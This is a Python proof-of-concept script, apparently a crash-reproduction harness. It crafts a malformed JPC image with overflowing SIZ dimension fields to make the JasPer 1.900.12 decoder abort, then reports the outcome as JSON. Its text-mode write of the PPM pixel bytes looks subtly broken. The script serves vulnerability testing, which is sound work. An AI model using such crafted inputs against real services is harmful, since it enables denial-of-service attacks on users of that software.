#!/usr/bin/env python3
"""
PoC for JasPer 1.900.12 - triggers SIGABRT via crafted JPC image.

The trigger:
1. Creates a valid 2x2 PPM image
2. Encodes it to JPC using the target binary itself
3. Modifies the SIZ marker to set Xsiz=0x7FFFFFFF, XOsiz=0x7FFFFFFE,
   Ysiz=0x7FFFFFFF, YOsiz=0x7FFFFFFE, XTsiz=0x7FFFFFFF, YTsiz=0x7FFFFFFF
4. Runs the binary with the crafted JPC, causing SIGABRT in the decoder

The assertion failure occurs in jpc_dec_process_siz() when the decoder
computes tile dimensions with values that cause integer overflow.
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time


def craft_trigger(binary_path: str, tmpdir: str) -> str:
    """Build a crafted JPC file that triggers SIGABRT in the JasPer decoder.

    Steps:
    1. Write a tiny valid PPM image.
    2. Encode it to JPC using the target binary.
    3. Modify the SIZ marker's dimension fields to trigger the abort.

    Returns the path to the crafted JPC file.
    """
    # Step 1: Create a valid 2x2 PPM image (3-component RGB)
    ppm_path = os.path.join(tmpdir, 'base.ppm')
    with open(ppm_path, 'w') as f:
        f.write('P6\n2 2\n255\n')
        f.write('\x80\x80\x80\x80\x80\x80\x80\x80\x80\x80\x80\x80')

    # Step 2: Encode it to JPC using the target binary
    jpc_path = os.path.join(tmpdir, 'base.jpc')
    encode_cmd = [
        binary_path,
        '--input', ppm_path,
        '--output', jpc_path,
        '--output-format', 'jpc',
    ]
    proc = subprocess.run(
        encode_cmd, capture_output=True, timeout=15,
    )
    if proc.returncode != 0:
        raise RuntimeError(
            f'Encoding failed: returncode={proc.returncode}, '
            f'stderr={proc.stderr.decode(errors="replace")}'
        )

    # Read the encoded JPC
    with open(jpc_path, 'rb') as f:
        jpc_data = bytearray(f.read())

    # Step 3: Locate the SIZ marker and modify dimension fields
    # SIZ marker: FF 51
    # SIZ structure: marker(2) + Lsiz(2) + Rsiz(2) + Xsiz(4) + Ysiz(4) +
    #   XOsiz(4) + YOsiz(4) + XTsiz(4) + YTsiz(4) + XTOsiz(4) + YTOsiz(4) +
    #   Csiz(2) + component_info(3*Csiz)
    siz_offset = -1
    for i in range(len(jpc_data) - 1):
        if jpc_data[i] == 0xff and jpc_data[i + 1] == 0x51:
            siz_offset = i
            break

    if siz_offset < 0:
        raise RuntimeError('SIZ marker not found in encoded JPC')

    # SIZ marker body starts at siz_offset + 2
    # Lsiz at offset +2 (2 bytes), Rsiz at offset +4 (2 bytes)
    # Xsiz at offset +6 (4 bytes), Ysiz at offset +10 (4 bytes)
    # XOsiz at offset +14 (4 bytes), YOsiz at offset +18 (4 bytes)
    # XTsiz at offset +22 (4 bytes), YTsiz at offset +26 (4 bytes)
    bod = siz_offset + 2

    # Set dimensions to trigger the assertion failure
    # When Xsiz=0x7FFFFFFF and XOsiz=0x7FFFFFFE, the tile width
    # calculation (XTsiz - XTOsiz) with specific values causes
    # an assertion failure in the JasPer decoder
    max_val = 0x7FFFFFFF
    max_off = 0x7FFFFFFE

    struct.pack_into('>I', jpc_data, bod + 4, max_val)   # Xsiz
    struct.pack_into('>I', jpc_data, bod + 8, max_val)   # Ysiz
    struct.pack_into('>I', jpc_data, bod + 12, max_off)  # XOsiz
    struct.pack_into('>I', jpc_data, bod + 16, max_off)  # YOsiz
    struct.pack_into('>I', jpc_data, bod + 20, max_val)  # XTsiz
    struct.pack_into('>I', jpc_data, bod + 24, max_val)  # YTsiz

    # Write the crafted JPC file
    trigger_path = os.path.join(tmpdir, 'trigger.jpc')
    with open(trigger_path, 'wb') as f:
        f.write(jpc_data)

    return trigger_path


def run_binary(binary_path: str, timeout: int) -> dict:
    """Run the JasPer binary with the crafted trigger JPC file.

    Returns a JSON-compatible result dict.
    """
    # Create temp directory for input/output files
    with tempfile.TemporaryDirectory(prefix='poc_') as tmpdir:
        try:
            trigger_path = craft_trigger(binary_path, tmpdir)
        except (RuntimeError, subprocess.TimeoutExpired,
                FileNotFoundError, PermissionError) as e:
            return {
                'binary': binary_path,
                'command': [],
                'returncode': -1,
                'signal': None,
                'timed_out': False,
                'runtime_ms': 0,
                'stdout': '',
                'stderr': '',
                'observable': {
                    'kind': 'custom',
                    'value': f'craft_trigger failed: {e}',
                    'path': None,
                },
                'error': str(e),
            }

        output_path = os.path.join(tmpdir, 'output.pnm')

        # Construct the command
        cmd = [
            binary_path,
            '--input', trigger_path,
            '--output', output_path,
            '--output-format', 'pnm',
        ]

        # Run the binary with timeout
        start_time = time.monotonic()
        timed_out = False
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                timeout=timeout,
            )
            returncode = proc.returncode
            stdout = proc.stdout
            stderr = proc.stderr
        except subprocess.TimeoutExpired:
            returncode = -signal.SIGKILL
            timed_out = True
            stdout = b''
            stderr = b''
        except FileNotFoundError:
            return {
                'binary': binary_path,
                'command': cmd,
                'returncode': -1,
                'signal': None,
                'timed_out': False,
                'runtime_ms': 0,
                'stdout': '',
                'stderr': '',
                'observable': {'kind': 'custom', 'value': 'binary not found', 'path': None},
                'error': f'binary not found: {binary_path}',
            }
        except PermissionError:
            return {
                'binary': binary_path,
                'command': cmd,
                'returncode': -1,
                'signal': None,
                'timed_out': False,
                'runtime_ms': 0,
                'stdout': '',
                'stderr': '',
                'observable': {'kind': 'custom', 'value': 'permission denied', 'path': None},
                'error': f'permission denied: {binary_path}',
            }

        runtime_ms = int((time.monotonic() - start_time) * 1000)

        # Determine signal name if killed by signal
        signal_name = None
        if returncode < 0:
            sig_num = -returncode
            try:
                signal_name = signal.Signals(sig_num).name
            except (ValueError, AttributeError):
                signal_name = f'SIGUNKNOWN({sig_num})'

        # Determine observable evidence
        if signal_name:
            observable = {
                'kind': 'crash_trace',
                'value': (
                    f'Process terminated with signal {signal_name} '
                    f'(exit code {returncode})'
                ),
                'path': None,
            }
        elif returncode != 0:
            stderr_str = stderr.decode('utf-8', errors='replace')[:8192]
            observable = {
                'kind': 'stderr',
                'value': stderr_str,
                'path': None,
            }
        else:
            observable = {
                'kind': 'custom',
                'value': 'binary exited normally with return code 0',
                'path': None,
            }

        # Truncate stdout/stderr to 8KB
        stdout_str = stdout.decode('utf-8', errors='replace')[:8192]
        stderr_str = stderr.decode('utf-8', errors='replace')[:8192]

        return {
            'binary': binary_path,
            'command': cmd,
            'returncode': returncode,
            'signal': signal_name,
            'timed_out': timed_out,
            'runtime_ms': runtime_ms,
            'stdout': stdout_str,
            'stderr': stderr_str,
            'observable': observable,
            'error': None,
        }


def main():
    parser = argparse.ArgumentParser(
        description='PoC for JasPer 1.900.12 SIGABRT trigger'
    )
    parser.add_argument(
        '--binary', required=True,
        help='Path to the JasPer binary'
    )
    parser.add_argument(
        '--json-out',
        help='Path to write JSON output (default: stdout)'
    )
    parser.add_argument(
        '--timeout', type=int, default=15,
        help='Per-run timeout in seconds (default: 15)'
    )
    args = parser.parse_args()

    if not os.path.isfile(args.binary):
        result = {
            'binary': args.binary,
            'command': [],
            'returncode': -1,
            'signal': None,
            'timed_out': False,
            'runtime_ms': 0,
            'stdout': '',
            'stderr': '',
            'observable': {
                'kind': 'custom',
                'value': 'binary not found',
                'path': None,
            },
            'error': f'binary not found: {args.binary}',
        }
    else:
        result = run_binary(args.binary, args.timeout)

    json_str = json.dumps(result, indent=2)

    if args.json_out:
        with open(args.json_out, 'w') as f:
            f.write(json_str)
    else:
        print(json_str)


if __name__ == '__main__':
    main()